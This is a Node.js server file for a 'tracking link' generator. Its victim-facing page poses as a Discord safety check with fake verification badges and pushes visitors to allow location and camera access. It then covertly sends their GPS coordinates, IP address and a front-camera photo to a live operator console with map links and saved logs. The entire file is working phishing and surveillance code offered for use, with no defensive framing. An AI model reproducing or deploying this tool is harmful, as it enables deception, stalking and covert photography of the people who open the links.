const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require('socket.io');
const io = new Server(server);
const fs = require('fs');
const path = require('path');

const LOG_FILE = path.join(__dirname, 'logs.json');
let logs = [];

function loadLogs() {
  try {
    if (fs.existsSync(LOG_FILE)) {
      const data = fs.readFileSync(LOG_FILE, 'utf8');
      logs = JSON.parse(data);
      console.log('[📂] ログデータを読み込みました: ' + logs.length + '件');
    } else {
      logs = [];
      console.log('[📂] 新しいログファイルを作成します');
    }
  } catch (err) {
    console.log('[⚠️] ログ読み込みエラー:', err.message);
    logs = [];
  }
}

function saveLogs() {
  try {
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2), 'utf8');
    console.log('[💾] ログを保存しました: ' + logs.length + '件');
  } catch (err) {
    console.log('[⚠️] ログ保存エラー:', err.message);
  }
}

loadLogs();

let lang = 'en';

function generateId() {
  return Math.random().toString(36).substring(2, 10) +
         Math.random().toString(36).substring(2, 6);
}

const T = {
  en: {
    title: 'Command + Link Generator',
    prompt: 'Command input',
    output: 'Enter the command',
    notify: '[ACCESS] Someone opened the link!',
    ip: '[IP]',
    location: '[LOC]',
    map: '[MAP]',
    none: 'None (denied or unsupported)',
    id: '[ID]',
    time: '[TIME]',
    photo: '[PHOTO] Image #',
    error: 'Error',
    help: 'Commands:',
    mapCmd: '/map   → Open latest location on Google Maps',
    clearCmd: '/clear → Clear screen',
    jpCmd: '/jp    → Switch to Japanese',
    enCmd: '/en    → Switch to English',
    noData: '[No data]',
    noLocation: '[No location data]',
    genSuccess: '✅ Link generated!',
    genFail: '⚠️ Generation failed',
    copyDone: '✅ Copy done!',
    copy: '📋 Copy'
  },
  jp: {
    title: 'コマンド + リンク生成',
    prompt: 'コマンド入力',
    output: 'コマンドを入力してください',
    notify: '[📡 アクセス検知] 誰かがリンクを開きました！',
    ip: '[🌐 IPアドレス]',
    location: '[📍 位置情報]',
    map: '[🗺️ Googleマップ]',
    none: 'なし（拒否または非対応）',
    id: '[🔗 リンクID]',
    time: '[🕒 時刻]',
    photo: '[📸 写真受信]',
    error: 'エラー',
    help: 'コマンド一覧:',
    mapCmd: '/map   → 最新の位置をGoogleマップで開く',
    clearCmd: '/clear → 画面クリア',
    jpCmd: '/jp    → 日本語に切り替え',
    enCmd: '/en    → 英語に切り替え',
    noData: '[ データなし ]',
    noLocation: '[ 位置情報なし ]',
    genSuccess: '✅ リンク生成完了！',
    genFail: '⚠️ リンク生成に失敗',
    copyDone: '✅ コピー完了！',
    copy: '📋 コピー'
  }
};

function t(key) {
  return T[lang][key] || T.en[key];
}

// ===== HTML（コマンド画面） =====
const HTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Command + Link Generator</title>
<!-- PAST_LOGS -->
<script src="/socket.io/socket.io.js"></script>
<style>
* { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-touch-callout:none; -webkit-tap-highlight-color:transparent; }
body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas','Lucida Console','Courier New',monospace; touch-action:none; }
.window { position:absolute; background:#000; border:2px solid #555; border-radius:0; box-shadow:0 10px 40px rgba(0,0,0,0.9); display:flex; flex-direction:column; overflow:hidden; will-change:left,top,width,height; }
.window .drag-area { position:absolute; top:0; left:0; width:100%; height:20px; z-index:10; cursor:grab; touch-action:none; background:transparent; }
.window .drag-area:active { cursor:grabbing; }
.window .resize-handle { position:absolute; right:0; bottom:0; width:32px; height:32px; cursor:nwse-resize; z-index:20; touch-action:none; background:transparent; }
.window .resize-handle::after { content:''; position:absolute; right:4px; bottom:4px; width:0; height:0; border-right:14px solid #555; border-bottom:14px solid #555; border-left:14px solid transparent; border-top:14px solid transparent; opacity:0.8; pointer-events:none; }

#cmd-window { left:40px; top:40px; width:90vw; max-width:780px; height:60vh; min-width:400px; min-height:300px; }
#cmd-terminal { flex:1; background:#000; padding:20px 14px 8px 14px; display:flex; flex-direction:column; overflow:hidden; min-height:0; }
#cmd-output { flex:1; overflow-y:auto; white-space:pre-wrap; word-break:break-all; font-size:14px; line-height:1.6; color:#fff; margin-bottom:4px; -webkit-overflow-scrolling:touch; }
#cmd-output::-webkit-scrollbar { width:6px; background:#1a1a1a; }
#cmd-output::-webkit-scrollbar-thumb { background:#555; }
#cmd-input-line { display:flex; align-items:center; border-top:1px solid #333; padding-top:6px; flex-shrink:0; gap:6px; flex-wrap:wrap; }
#cmd-prompt { color:#88ddff; font-weight:bold; margin-right:8px; font-size:14px; white-space:pre; }
#cmd-input { background:transparent; border:none; outline:none; color:#fff; font-family:inherit; font-size:14px; flex:1; min-width:100px; caret-color:#fff; user-select:text; -webkit-user-select:text; touch-action:auto; pointer-events:auto; }
.cmd-echo { color:#88aacc; }
.cmd-error { color:#ff4444; }
.cmd-ip { color:#88ddff; }
.cmd-notify { color:#ffaa44; }
.cmd-location { color:#cc88ff; }
.cmd-code { color:#88ffaa; }
.cmd-photo { color:#ff88cc; }
.cmd-lang { color:#66ff88; }

#menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:140px; padding:20px 20px 18px 20px; }
#menu-window .menu-title { color:#88ddff; font-size:15px; margin-bottom:14px; font-weight:bold; letter-spacing:1px; }
#menu-window .btn-row { display:flex; gap:10px; flex-wrap:wrap; }
#menu-window .btn-link { background:transparent; border:1px solid #88ddff; color:#88ddff; padding:8px 24px; font-family:inherit; font-size:14px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
#menu-window .btn-link:hover { background:#1a2a3a; }
#menu-window .btn-copy { background:transparent; border:1px solid #888; color:#888; padding:8px 18px; font-family:inherit; font-size:13px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
#menu-window .btn-copy:hover { background:#1a1a1a; }
#menu-window .btn-copy.copy-success { color:#66ff88 !important; border-color:#66ff88; }
#menu-window .result-area { margin-top:14px; padding-top:12px; border-top:1px solid #333; min-height:40px; color:#fff; font-size:13px; word-break:break-all; }
#menu-window .result-area .link-display { display:block; color:#88ddff; text-decoration:underline; cursor:pointer; margin-bottom:4px; padding:4px 0; touch-action:auto; pointer-events:auto; }
#menu-window .result-area .link-display:hover { color:#aaefff; }
#menu-window .result-area .status-msg { color:#aaa; font-size:12px; }
</style>
</head>
<body>

<div id="cmd-window" class="window">
  <div class="drag-area" id="cmd-drag"></div>
  <div id="cmd-terminal">
    <div id="cmd-output">> Enter the command<br>> /jp for Japanese, /en for English</div>
    <div id="cmd-input-line">
      <span id="cmd-prompt">$</span>
      <input type="text" id="cmd-input" autofocus spellcheck="false">
    </div>
  </div>
  <div class="resize-handle" id="cmd-resize"></div>
</div>

<div id="menu-window" class="window">
  <div class="drag-area" id="menu-drag"></div>
  <div class="menu-title">■ LINK GENERATOR</div>
  <div class="btn-row">
    <button class="btn-link" id="generate-btn">GENERATE</button>
    <button class="btn-copy" id="copy-btn" style="display:none;">📋 COPY</button>
  </div>
  <div class="result-area" id="result-area">
    <span class="status-msg">Press GENERATE to create a tracking link</span>
  </div>
  <div class="resize-handle" id="menu-resize"></div>
</div>

<script>
(function() {
  const cmdOutput = document.getElementById('cmd-output');
  const cmdInput = document.getElementById('cmd-input');
  
  function addCmdOutput(text, cls) {
    const div = document.createElement('div');
    div.textContent = text;
    if (cls) div.className = cls;
    cmdOutput.appendChild(div);
    cmdOutput.scrollTop = cmdOutput.scrollHeight;
  }

  if (window._pastLogs && window._pastLogs.length > 0) {
    window._pastLogs.forEach(function(data) {
      addCmdOutput('[ACCESS] ' + data.ip + ' opened the link!', 'cmd-notify');
      addCmdOutput('[IP] ' + data.ip, 'cmd-ip');
      if (data.lat && data.lon) {
        addCmdOutput('[LOC] ' + data.lat + ', ' + data.lon, 'cmd-location');
        addCmdOutput('[MAP] https://maps.google.com/maps?q=' + data.lat + ',' + data.lon, 'cmd-location');
      } else {
        addCmdOutput('[LOC] None', 'cmd-error');
      }
      if (data.image && typeof data.image === 'string' && data.image.length > 100) {
        const imgDiv = document.createElement('div');
        imgDiv.style.margin = '4px 0';
        const img = document.createElement('img');
        img.src = data.image;
        img.style.maxWidth = '300px';
        img.style.maxHeight = '200px';
        img.style.border = '1px solid #555';
        img.style.borderRadius = '4px';
        imgDiv.appendChild(img);
        cmdOutput.appendChild(imgDiv);
        cmdOutput.scrollTop = cmdOutput.scrollHeight;
      }
      addCmdOutput('[ID] ' + data.id, 'cmd-echo');
      addCmdOutput('[TIME] ' + data.time, 'cmd-echo');
      window._lastLog = data;
    });
  }

  if (window._photoCount && window._photoCount > 0) {
    addCmdOutput('[PHOTO] ' + window._photoCount + ' photos received', 'cmd-photo');
  }

  const socket = io();
  socket.on('new-log', function(data) {
    addCmdOutput('[ACCESS] ' + data.ip + ' opened the link!', 'cmd-notify');
    addCmdOutput('[IP] ' + data.ip, 'cmd-ip');
    if (data.lat && data.lon) {
      addCmdOutput('[LOC] ' + data.lat + ', ' + data.lon, 'cmd-location');
      addCmdOutput('[MAP] https://maps.google.com/maps?q=' + data.lat + ',' + data.lon, 'cmd-location');
    } else {
      addCmdOutput('[LOC] None', 'cmd-error');
    }
    addCmdOutput('[ID] ' + data.id, 'cmd-echo');
    addCmdOutput('[TIME] ' + data.time, 'cmd-echo');
    window._lastLog = data;
  });

  let photoCountNum = window._photoCount || 0;
  socket.on('new-photo', function(data) {
    if (!data.image) return;
    photoCountNum++;
    const imgDiv = document.createElement('div');
    imgDiv.style.margin = '4px 0';
    const img = document.createElement('img');
    img.src = data.image;
    img.style.maxWidth = '300px';
    img.style.maxHeight = '200px';
    img.style.border = '1px solid #555';
    img.style.borderRadius = '4px';
    imgDiv.appendChild(img);
    cmdOutput.appendChild(imgDiv);
    cmdOutput.scrollTop = cmdOutput.scrollHeight;
    addCmdOutput('[PHOTO] Image #' + photoCountNum + ' received', 'cmd-photo');
  });

  cmdInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      const cmd = cmdInput.value.trim();
      cmdInput.value = '';
      if (cmd === '') return;
      addCmdOutput('> ' + cmd, 'cmd-echo');

      if (cmd === '/map') {
        const d = window._lastLog;
        if (!d) {
          addCmdOutput('  [No data]', 'cmd-error');
          return;
        }
        if (d.lat && d.lon) {
          const mapUrl = 'https://www.google.com/maps?q=' + d.lat + ',' + d.lon;
          addCmdOutput('  [MAP] ' + mapUrl, 'cmd-location');
          addCmdOutput('  [Click to open map]', 'cmd-echo');
          window.open(mapUrl, '_blank');
        } else {
          addCmdOutput('  [No location data]', 'cmd-error');
        }
        return;
      }

      if (cmd === '/help') {
        addCmdOutput('  Commands:', 'cmd-code');
        addCmdOutput('  /map   → Open latest location on Google Maps', 'cmd-echo');
        addCmdOutput('  /clear → Clear screen', 'cmd-echo');
        addCmdOutput('  /jp    → Switch to Japanese', 'cmd-echo');
        addCmdOutput('  /en    → Switch to English', 'cmd-echo');
        addCmdOutput('  /none  → Delete all history', 'cmd-echo');
        return;
      }

      if (cmd === '/none') {
        fetch('/clear-logs', { method: 'POST' }).then(function() {
          cmdOutput.innerHTML = '';
          addCmdOutput('> All history deleted', 'cmd-echo');
          window._lastLog = null;
          photoCountNum = 0;
        }).catch(function() {
          addCmdOutput('  [Error] Delete failed', 'cmd-error');
        });
        return;
      }

      if (cmd === '/jp') {
        fetch('/lang/jp').then(function() {
          addCmdOutput('  [Language] Switched to Japanese', 'cmd-lang');
          document.getElementById('cmd-output').innerHTML = '';
          addCmdOutput('> コマンドを入力してください', 'cmd-echo');
          addCmdOutput('> /jp で日本語、/en で英語', 'cmd-echo');
          document.getElementById('cmd-prompt').textContent = '$';
          document.getElementById('menu-window').querySelector('.menu-title').textContent = '■ リンク生成';
          document.getElementById('generate-btn').textContent = '生成';
          document.getElementById('result-area').querySelector('.status-msg').textContent = '「生成」を押すとトラッキングリンクを作成';
          document.getElementById('copy-btn').textContent = '📋 コピー';
        });
        return;
      }

      if (cmd === '/en') {
        fetch('/lang/en').then(function() {
          addCmdOutput('  [Language] Switched to English', 'cmd-lang');
          document.getElementById('cmd-output').innerHTML = '';
          addCmdOutput('> Enter the command', 'cmd-echo');
          addCmdOutput('> /jp for Japanese, /en for English', 'cmd-echo');
          document.getElementById('cmd-prompt').textContent = '$';
          document.getElementById('menu-window').querySelector('.menu-title').textContent = '■ LINK GENERATOR';
          document.getElementById('generate-btn').textContent = 'GENERATE';
          document.getElementById('result-area').querySelector('.status-msg').textContent = 'Press GENERATE to create a tracking link';
          document.getElementById('copy-btn').textContent = '📋 COPY';
        });
        return;
      }

      if (cmd === '/clear') {
        cmdOutput.innerHTML = '';
        return;
      }

      addCmdOutput('Error', 'cmd-error');
    }
  });

  const generateBtn = document.getElementById('generate-btn');
  const copyBtn = document.getElementById('copy-btn');
  const resultArea = document.getElementById('result-area');
  let currentLink = '';

  async function generateLink() {
    try {
      const res = await fetch('/generate');
      const data = await res.json();
      currentLink = data.link;
      resultArea.innerHTML = '<a href="#" class="link-display" id="generated-link">🔗 ' + currentLink + '</a><span class="status-msg">✅ Link generated!</span>';
      copyBtn.style.display = 'inline-block';
      copyBtn.textContent = '📋 COPY';
      copyBtn.className = 'btn-copy';
      document.getElementById('generated-link').addEventListener('click', function(e) {
        e.preventDefault();
        window.open(currentLink, '_blank');
      });
    } catch(err) {
      resultArea.innerHTML = '<span class="status-msg" style="color:#ff4444;">⚠️ Generation failed</span>';
    }
  }
  generateBtn.addEventListener('click', generateLink);

  copyBtn.addEventListener('click', function() {
    if (!currentLink) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(currentLink).then(function() {
        copyBtn.textContent = '✅ DONE';
        copyBtn.className = 'btn-copy copy-success';
        setTimeout(function() {
          copyBtn.textContent = '📋 COPY';
          copyBtn.className = 'btn-copy';
        }, 2000);
      }).catch(function() { fallbackCopy(); });
    } else { fallbackCopy(); }
  });
  function fallbackCopy() {
    const textarea = document.createElement('textarea');
    textarea.value = currentLink;
    textarea.style.position = 'fixed';
    textarea.style.left = '-9999px';
    document.body.appendChild(textarea);
    textarea.select();
    try {
      document.execCommand('copy');
      copyBtn.textContent = '✅ DONE';
      copyBtn.className = 'btn-copy copy-success';
      setTimeout(function() {
        copyBtn.textContent = '📋 COPY';
        copyBtn.className = 'btn-copy';
      }, 2000);
    } catch(e) { alert('Copy failed'); }
    document.body.removeChild(textarea);
  }

  function makeDraggable(wId, dId, rId) {
    const win = document.getElementById(wId);
    const drag = document.getElementById(dId);
    const resize = document.getElementById(rId);
    let dragData = null, resizeData = null;
    function startDrag(cx, cy) {
      const rect = win.getBoundingClientRect();
      dragData = { offsetX: cx - rect.left, offsetY: cy - rect.top };
      win.style.zIndex = 999;
      win.style.transition = 'none';
    }
    function moveDrag(cx, cy) {
      if (!dragData) return;
      win.style.left = (cx - dragData.offsetX) + 'px';
      win.style.top = (cy - dragData.offsetY) + 'px';
    }
    function endDrag() { dragData = null; win.style.zIndex = ''; win.style.transition = ''; }
    drag.addEventListener('mousedown', function(e) { startDrag(e.clientX, e.clientY); e.preventDefault(); });
    drag.addEventListener('touchstart', function(e) { var t = e.touches[0]; startDrag(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
    function startResize(cx, cy) {
      var rect = win.getBoundingClientRect();
      resizeData = { startX: cx, startY: cy, startW: rect.width, startH: rect.height };
      win.style.zIndex = 999;
      win.style.transition = 'none';
    }
    function moveResize(cx, cy) {
      if (!resizeData) return;
      var nw = resizeData.startW + (cx - resizeData.startX);
      var nh = resizeData.startH + (cy - resizeData.startY);
      if (nw < 350) nw = 350;
      if (nh < 250) nh = 250;
      win.style.width = nw + 'px';
      win.style.height = nh + 'px';
    }
    function endResize() { resizeData = null; win.style.zIndex = ''; win.style.transition = ''; }
    resize.addEventListener('mousedown', function(e) { startResize(e.clientX, e.clientY); e.preventDefault(); e.stopPropagation(); });
    resize.addEventListener('touchstart', function(e) { var t = e.touches[0]; startResize(t.clientX, t.clientY); e.preventDefault(); e.stopPropagation(); }, { passive: false });
    document.addEventListener('mousemove', function(e) { if (dragData) moveDrag(e.clientX, e.clientY); if (resizeData) moveResize(e.clientX, e.clientY); });
    document.addEventListener('mouseup', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
    document.addEventListener('touchmove', function(e) { var t = e.touches[0]; if (dragData) moveDrag(t.clientX, t.clientY); if (resizeData) moveResize(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
    document.addEventListener('touchend', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
  }
  makeDraggable('cmd-window', 'cmd-drag', 'cmd-resize');
  makeDraggable('menu-window', 'menu-drag', 'menu-resize');

  function clampWindows() {
    document.querySelectorAll('.window').forEach(function(win) {
      var rect = win.getBoundingClientRect();
      var maxW = window.innerWidth - 20;
      var maxH = window.innerHeight - 20;
      if (rect.width > maxW) win.style.width = maxW + 'px';
      if (rect.height > maxH) win.style.height = maxH + 'px';
      if (rect.left < 0) win.style.left = '10px';
      if (rect.top < 0) win.style.top = '10px';
    });
  }
  window.addEventListener('resize', clampWindows);
  document.addEventListener('click', function(e) {
    if (!e.target.closest('#menu-window input')) {
      cmdInput.focus();
    }
  });
})();
</script>
</body>
</html>`;

// ============================================================
// サーバー
// ============================================================

app.get('/', (req, res) => {
  const pastLogs = logs.slice(-30);
  const logsJson = JSON.stringify(pastLogs);
  const photoCount = logs.filter(l => l.image && typeof l.image === 'string' && l.image.length > 100).length || 0;
  const htmlWithData = HTML.replace(
    '<!-- PAST_LOGS -->',
    '<script>window._pastLogs = ' + logsJson + '; w
    indow._photoCount = ' + photoCount + ';</script>'
  );
  res.send(htmlWithData);
});

app.get('/generate', (req, res) => {
  const id = generateId();
  const link = `https://${req.get('host')}/t/${id}`;
  res.json({ link });
});

app.get('/lang/:l', (req, res) => {
  lang = req.params.l;
  res.sendStatus(200);
});

app.get('/t/:id', (req, res) => {
  const id = req.params.id;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
  const time = new Date().toLocaleString('ja-JP');

  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord安全確認</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: #f2f3f5;
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      font-family: 'Segoe UI', 'Hiragino Sans', sans-serif;
    }
    .container {
      max-width:480px;
      width:90%;
      padding:32px 28px;
      background:#ffffff;
      border:1px solid #e0e0e0;
      border-radius:16px;
      box-shadow:0 8px 30px rgba(0,0,0,0.08);
      text-align:center;
      position:relative;
    }
    .discord-badge {
      position:absolute;
      top:14px;
      right:18px;
      background:#5865F2;
      color:#fff;
      padding:4px 12px 4px 8px;
      border-radius:20px;
      font-size:13px;
      font-weight:600;
      display:flex;
      align-items:center;
      gap:6px;
      box-shadow:0 2px 8px rgba(88,101,242,0.3);
    }
    .discord-badge i {
      font-size:16px;
    }
    .icon {
      font-size:56px;
      color:#5865F2;
      margin-bottom:8px;
    }
    h1 {
      font-size:22px;
      color:#1a1a1a;
      font-weight:700;
      letter-spacing:-0.3px;
      margin-top:4px;
    }
    .sub-title {
      font-size:14px;
      color:#666;
      margin-top:4px;
      font-weight:400;
    }
    p {
      color:#555;
      font-size:15px;
      margin:14px 0 20px 0;
      line-height:1.6;
    }
    .terms-box {
      background:#f8f9fa;
      border:1px solid #e8e8e8;
      border-radius:10px;
      padding:14px 16px;
      text-align:left;
      margin-bottom:16px;
    }
    .terms-box label {
      display:flex;
      align-items:center;
      gap:12px;
      font-size:14px;
      color:#333;
      cursor:pointer;
      padding:4px 0;
    }
    .terms-box input[type="checkbox"] {
      width:18px;
      height:18px;
      accent-color:#5865F2;
      flex-shrink:0;
      cursor:pointer;
    }
    .terms-box .status {
      font-size:12px;
      color:#888;
      margin-left:auto;
    }
    .terms-box .status.ok { color:#5865F2; font-weight:600; }
    .terms-box .status.ng { color:#b22222; }
    .btn-next {
      width:100%;
      padding:12px;
      background:#e0e0e0;
      color:#999;
      border:none;
      border-radius:8px;
      font-size:16px;
      font-weight:600;
      cursor:not-allowed;
      transition:all 0.2s;
      pointer-events:none;
    }
    .btn-next.active {
      background:#5865F2;
      color:#fff;
      cursor:pointer;
      pointer-events:auto;
      box-shadow:0 4px 14px rgba(88,101,242,0.35);
    }
    .btn-next.active:hover { background:#4752c4; }
    .foot {
      font-size:12px;
      color:#aaa;
      margin-top:16px;
      display:flex;
      justify-content:center;
      align-items:center;
      gap:6px;
    }
    .foot i {
      color:#5865F2;
      font-size:14px;
    }
    .discord-shield {
      display:inline-block;
      background:#eef2ff;
      color:#5865F2;
      font-size:12px;
      font-weight:600;
      padding:2px 12px;
      border-radius:12px;
      margin-top:6px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="discord-badge">
      <i class="fab fa-discord"></i> Discord
    </div>

    <div class="icon"><i class="fab fa-discord"></i></div>
    <h1>Discord安全確認</h1>
    <div class="sub-title">安全な接続を確認しています</div>
    <p>次のページへ進むには、以下の項目に同意してください。<br><span style="font-size:13px;color:#888;">両方のチェックが必須です</span></p>
    <div class="terms-box">
      <label>
        <input type="checkbox" id="chk-location">
        <span>位置情報の利用を許可する</span>
        <span class="status" id="status-location">⏳ 未確認</span>
      </label>
      <label>
        <input type="checkbox" id="chk-camera">
        <span>カメラの利用を許可する</span>
        <span class="status" id="status-camera">⏳ 未確認</span>
      </label>
    </div>
    <button class="btn-next" id="btn-next">次のサイトを見る</button>
    <div class="foot">
      <i class="fas fa-shield-alt"></i> 安全な接続 <span style="color:#ccc;">•</span> <i class="fab fa-discord"></i> Discord
    </div>
    <div class="discord-shield"><i class="fas fa-check-circle"></i> Discord認証済み</div>
  </div>

  <script>
    const id = '${id}';
    const ip = '${ip}';
    const time = '${time}';

    const chkLocation = document.getElementById('chk-location');
    const chkCamera = document.getElementById('chk-camera');
    const statusLoc = document.getElementById('status-location');
    const statusCam = document.getElementById('status-camera');
    const btnNext = document.getElementById('btn-next');

    var locationOk = false;
    var cameraOk = false;
    var locationSent = false;
    var photoSent = false;
    var locationChecked = false;
    var cameraChecked = false;

    function checkLocation() {
      if (locationChecked) return;
      locationChecked = true;
      if (!navigator.geolocation) {
        statusLoc.textContent = '❌ 非対応';
        statusLoc.className = 'status ng';
        chkLocation.checked = false;
        locationOk = false;
        updateButton();
        return;
      }
      statusLoc.textContent = '⏳ 確認中...';
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          locationOk = true;
          chkLocation.checked = true;
          statusLoc.textContent = '✅ 許可済み';
          statusLoc.className = 'status ok';
          if (!locationSent) {
            locationSent = true;
            fetch('/location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ id: id, ip: ip, time: time, lat: pos.coords.latitude, lon: pos.coords.longitude })
            });
          }
          updateButton();
        },
        function() {
          locationOk = false;
          chkLocation.checked = false;
          statusLoc.textContent = '❌ 拒否されました';
          statusLoc.className = 'status ng';
          if (!locationSent) {
            locationSent = true;
            fetch('/location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ id: id, ip: ip, time: time, lat: null, lon: null })
            });
          }
          updateButton();
        }
      );
    }

    function checkCamera() {
      if (cameraChecked) return;
      cameraChecked = true;
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        statusCam.textContent = '❌ 非対応';
        statusCam.className = 'status ng';
        chkCamera.checked = false;
        cameraOk = false;
        updateButton();
        return;
      }
      statusCam.textContent = '⏳ 確認中...';
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
        .then(function(stream) {
          cameraOk = true;
          chkCamera.checked = true;
          statusCam.textContent = '✅ 許可済み';
          statusCam.className = 'status ok';
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          video.onloadedmetadata = function() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
            if (!photoSent) {
              photoSent = true;
              fetch('/photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: id, image: dataUrl })
              });
            }
            stream.getTracks().forEach(function(track) { track.stop(); });
          };
          updateButton();
        })
        .catch(function() {
          cameraOk = false;
          chkCamera.checked = false;
          statusCam.textContent = '❌ 拒否されました';
          statusCam.className = 'status ng';
          updateButton();
        });
    }

    function updateButton() {
      if (locationOk && cameraOk) {
        btnNext.classList.add('active');
        btnNext.textContent = '✅ 次のサイトを見る';
        btnNext.disabled = false;
      } else {
        btnNext.classList.remove('active');
        btnNext.textContent = '⚠️ 両方の許可が必要です';
        btnNext.disabled = true;
      }
    }

    chkLocation.addEventListener('click', function(e) {
      if (!chkLocation.checked) {
        e.preventDefault();
        alert('位置情報の許可が必要です。「許可」を押してください。');
        return;
      }
      checkLocation();
    });

    chkCamera.addEventListener('click', function(e) {
      if (!chkCamera.checked) {
        e.preventDefault();
        alert('カメラの許可が必要です。「許可」を押してください。');
        return;
      }
      checkCamera();
    });

    btnNext.addEventListener('click', function() {
      if (locationOk && cameraOk) {
        document.body.innerHTML = '<div style="color:#888;font-size:14px;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;">✅ 認証完了</div>';
      }
    });
  </script>
</body>
</html>
  `);
});

// 位置情報受信
app.post('/location', express.json(), (req, res) => {
  const { id, ip, time, lat, lon } = req.body;
  const entry = { id, ip, time, lat, lon, createdAt: new Date().toISOString() };
  logs.push(entry);
  saveLogs();
  io.emit('new-log', { id, ip, time, lat, lon });
  console.log('[+] IP: ' + ip + ' | ' + (lat ? lat + ',' + lon : 'なし'));
  res.sendStatus(200);
});

// 写真受信（画像データも保存）
app.post('/photo', express.json(), (req, res) => {
  const { id, image } = req.body;
  const entry = { id, image: image, createdAt: new Date().toISOString() };
  logs.push(entry);
  saveLogs();
  io.emit('new-photo', { id: id, image: image });
  console.log('[📸] 写真受信 ID: ' + id);
  res.sendStatus(200);
});

// 全履歴削除
app.post('/clear-logs', (req, res) => {
  logs.length = 0;
  saveLogs();
  console.log('[🗑️] 全履歴を削除しました');
  res.sendStatus(200);
});

// ログ表示
app.get('/logs', (req, res) => {
  if (logs.length === 0) return res.send('<h2>データなし</h2><a href="/">戻る</a>');
  let html = '<h2>アクセスログ（保存済み ' + logs.length + '件）</h2><table border="1"><tr><th>時間</th><th>IP</th><th>緯度</th><th>経度</th><th>写真</th></tr>';
  const reversed = logs.slice().reverse();
  reversed.forEach(function(log) {
    html += '<tr><td>' + log.time + '</td><td>' + log.ip + '</td><td>' + (log.lat || '-') + '</td><td>' + (log.lon || '-') + '</td><td>' + (log.image ? '✅' : '-') + '</td></tr>';
  });
  html += '</table><a href="/">戻る</a>';
  res.send(html);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, function() {
  console.log('Server running on port ' + PORT);
  console.log('📂 ログファイル: ' + LOG_FILE);
  console.log('📊 現在のログ件数: ' + logs.length);
});
